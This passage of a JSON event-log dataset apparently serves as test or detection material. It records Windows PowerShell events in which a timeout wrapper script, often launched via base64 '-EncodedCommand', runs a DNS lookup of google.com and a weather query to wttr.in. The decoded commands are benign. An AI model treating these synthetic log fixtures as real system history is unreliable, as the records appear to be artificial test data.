CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFIAZQBzAG8AbAB2AGUALQBEAG4AcwBOAGEAbQBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUALgBjAG8AbQAgAC0AVAB5AHAAZQAgAEEACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "$commandToRun = @'\nResolve-DnsName -Name google.com -Type A\n'@\n$timeoutSeconds = 25\n$result = @{\n    Stdout = \"\"\n    Stderr = \"\"\n    ReturnCode = -1\n}\ntry {\n    $scriptBlock = [scriptblock]::Create($commandToRun)\n    $job = Start-Job -ScriptBlock $scriptBlock\n    if (Wait-Job -Job $job -Timeout $timeoutSeconds) {\n        $output = Receive-Job -Job $job\n        $result.Stdout = ($output | Out-String).Trim()\n        if ($job.State -eq 'Failed') {\n            $result.Stderr = $job.ChildJobs[0].JobStateInfo.Reason.Message\n            $result.ReturnCode = 1\n        } else {\n            $result.ReturnCode = 0\n        }\n    } else {\n        $result.Stderr = \"Command timed out on the server after $timeoutSeconds seconds.\"\n        $result.ReturnCode = 124\n    }\n} catch {\n    $result.Stderr = \"Wrapper Script Error: $($_.Exception.Message)\"\n    $result.ReturnCode = 1\n} finally {\n    if ($job) {\n        Stop-Job -Job $job -ErrorAction SilentlyContinue\n        Remove-Job -Job $job -ErrorAction SilentlyContinue -Force\n    }\n}\n$result | ConvertTo-Json -Compress"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40962,
      "details": "PowerShell console is ready for user input"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 53504,
      "details": "Windows PowerShell has started an IPC listening thread on process: 3004 in AppDomain: DefaultAppDomain."
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40961,
      "details": "PowerShell console is starting up"
    }
  ],
  "PS-053": [
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "$global:?"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAHcAdAB0AHIALgBpAG4ALwBMAG8AbgBkAG8AbgAKACcAQAAKACQAdABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAPQAgADIANQAKACQAcgBlAHMAdQBsAHQAIAA9ACAAQAB7AAoAIAAgACAAIABTAHQAZABvAHUAdAAgAD0AIAAiACIACgAgACAAIAAgAFMAdABkAGUAcgByACAAPQAgACIAIgAKACAAIAAgACAAUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAtADEACgB9AAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AEIAbABvAGMAawAgAD0AIABbAHMAYwByAGkAcAB0AGIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAYwBvAG0AbQBhAG4AZABUAG8AUgB1AG4AKQAKACAAIAAgACAAJABqAG8AYgAgAD0AIABTAHQAYQByAHQALQBKAG8AYgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsACgAgACAAIAAgAGkAZgAgACgAVwBhAGkAdAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAFQAaQBtAGUAbwB1AHQAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgAFIAZQBjAGUAaQB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABvAHUAdAAgAD0AIAAoACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAC4AVAByAGkAbQAoACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGoAbwBiAC4AUwB0AGEAdABlACAALQBlAHEAIAAnAEYAYQBpAGwAZQBkACcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAJABqAG8AYgAuAEMAaABpAGwAZABKAG8AYgBzAFsAMABdAC4ASgBvAGIAUwB0AGEAdABlAEkAbgBmAG8ALgBSAGUAYQBzAG8AbgAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAIAAgACAAIAAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAEMAbwBtAG0AYQBuAGQAIAB0AGkAbQBlAGQAIABvAHUAdAAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGYAdABlAHIAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAHMAZQBjAG8AbgBkAHMALgAiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEAMgA0AAoAIAAgACAAIAB9AAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAFcAcgBhAHAAcABlAHIAIABTAGMAcgBpAHAAdAAgAEUAcgByAG8AcgA6ACAAJAAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACIACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgAGkAZgAgACgAJABqAG8AYgApACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAbwBwAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAH0ACgAkAHIAZQBzAHUAbAB0ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0AQwBvAG0AcAByAGUAcwBzAAoA"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAHcAdAB0AHIALgBpAG4ALwBMAG8AbgBkAG8AbgAKACcAQAAKACQAdABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAPQAgADIANQAKACQAcgBlAHMAdQBsAHQAIAA9ACAAQAB7AAoAIAAgACAAIABTAHQAZABvAHUAdAAgAD0AIAAiACIACgAgACAAIAAgAFMAdABkAGUAcgByACAAPQAgACIAIgAKACAAIAAgACAAUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAtADEACgB9AAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AEIAbABvAGMAawAgAD0AIABbAHMAYwByAGkAcAB0AGIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAYwBvAG0AbQBhAG4AZABUAG8AUgB1AG4AKQAKACAAIAAgACAAJABqAG8AYgAgAD0AIABTAHQAYQByAHQALQBKAG8AYgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsACgAgACAAIAAgAGkAZgAgACgAVwBhAGkAdAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAFQAaQBtAGUAbwB1AHQAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgAFIAZQBjAGUAaQB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABvAHUAdAAgAD0AIAAoACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAC4AVAByAGkAbQAoACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGoAbwBiAC4AUwB0AGEAdABlACAALQBlAHEAIAAnAEYAYQBpAGwAZQBkACcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAJABqAG8AYgAuAEMAaABpAGwAZABKAG8AYgBzAFsAMABdAC4ASgBvAGIAUwB0AGEAdABlAEkAbgBmAG8ALgBSAGUAYQBzAG8AbgAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAIAAgACAAIAAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAEMAbwBtAG0AYQBuAGQAIAB0AGkAbQBlAGQAIABvAHUAdAAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGYAdABlAHIAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAHMAZQBjAG8AbgBkAHMALgAiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEAMgA0AAoAIAAgACAAIAB9AAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAFcAcgBhAHAAcABlAHIAIABTAGMAcgBpAHAAdAAgAEUAcgByAG8AcgA6ACAAJAAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACIACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgAGkAZgAgACgAJABqAG8AYgApACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAbwBwAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAH0ACgAkAHIAZQBzAHUAbAB0ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0AQwBvAG0AcAByAGUAcwBzAAoA"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAHcAdAB0AHIALgBpAG4ALwBMAG8AbgBkAG8AbgAKACcAQAAKACQAdABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAPQAgADIANQAKACQAcgBlAHMAdQBsAHQAIAA9ACAAQAB7AAoAIAAgACAAIABTAHQAZABvAHUAdAAgAD0AIAAiACIACgAgACAAIAAgAFMAdABkAGUAcgByACAAPQAgACIAIgAKACAAIAAgACAAUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAtADEACgB9AAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AEIAbABvAGMAawAgAD0AIABbAHMAYwByAGkAcAB0AGIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAYwBvAG0AbQBhAG4AZABUAG8AUgB1AG4AKQAKACAAIAAgACAAJABqAG8AYgAgAD0AIABTAHQAYQByAHQALQBKAG8AYgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsACgAgACAAIAAgAGkAZgAgACgAVwBhAGkAdAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAFQAaQBtAGUAbwB1AHQAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgAFIAZQBjAGUAaQB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABvAHUAdAAgAD0AIAAoACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAC4AVAByAGkAbQAoACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGoAbwBiAC4AUwB0AGEAdABlACAALQBlAHEAIAAnAEYAYQBpAGwAZQBkACcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAJABqAG8AYgAuAEMAaABpAGwAZABKAG8AYgBzAFsAMABdAC4ASgBvAGIAUwB0AGEAdABlAEkAbgBmAG8ALgBSAGUAYQBzAG8AbgAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAIAAgACAAIAAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAEMAbwBtAG0AYQBuAGQAIAB0AGkAbQBlAGQAIABvAHUAdAAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGYAdABlAHIAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAHMAZQBjAG8AbgBkAHMALgAiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEAMgA0AAoAIAAgACAAIAB9AAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAFcAcgBhAHAAcABlAHIAIABTAGMAcgBpAHAAdAAgAEUAcgByAG8AcgA6ACAAJAAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACIACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgAGkAZgAgACgAJABqAG8AYgApACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAbwBwAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAH0ACgAkAHIAZQBzAHUAbAB0ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0AQwBvAG0AcAByAGUAcwBzAAoA"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAHcAdAB0AHIALgBpAG4ALwBMAG8AbgBkAG8AbgAKACcAQAAKACQAdABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAPQAgADIANQAKACQAcgBlAHMAdQBsAHQAIAA9ACAAQAB7AAoAIAAgACAAIABTAHQAZABvAHUAdAAgAD0AIAAiACIACgAgACAAIAAgAFMAdABkAGUAcgByACAAPQAgACIAIgAKACAAIAAgACAAUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAtADEACgB9AAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AEIAbABvAGMAawAgAD0AIABbAHMAYwByAGkAcAB0AGIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAYwBvAG0AbQBhAG4AZABUAG8AUgB1AG4AKQAKACAAIAAgACAAJABqAG8AYgAgAD0AIABTAHQAYQByAHQALQBKAG8AYgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsACgAgACAAIAAgAGkAZgAgACgAVwBhAGkAdAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAFQAaQBtAGUAbwB1AHQAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgAFIAZQBjAGUAaQB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABvAHUAdAAgAD0AIAAoACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAC4AVAByAGkAbQAoACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGoAbwBiAC4AUwB0AGEAdABlACAALQBlAHEAIAAnAEYAYQBpAGwAZQBkACcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAJABqAG8AYgAuAEMAaABpAGwAZABKAG8AYgBzAFsAMABdAC4ASgBvAGIAUwB0AGEAdABlAEkAbgBmAG8ALgBSAGUAYQBzAG8AbgAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAIAAgACAAIAAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAEMAbwBtAG0AYQBuAGQAIAB0AGkAbQBlAGQAIABvAHUAdAAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGYAdABlAHIAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAHMAZQBjAG8AbgBkAHMALgAiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEAMgA0AAoAIAAgACAAIAB9AAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAFcAcgBhAHAAcABlAHIAIABTAGMAcgBpAHAAdAAgAEUAcgByAG8AcgA6ACAAJAAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACIACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgAGkAZgAgACgAJABqAG8AYgApACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAbwBwAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAH0ACgAkAHIAZQBzAHUAbAB0ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0AQwBvAG0AcAByAGUAcwBzAAoA"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand 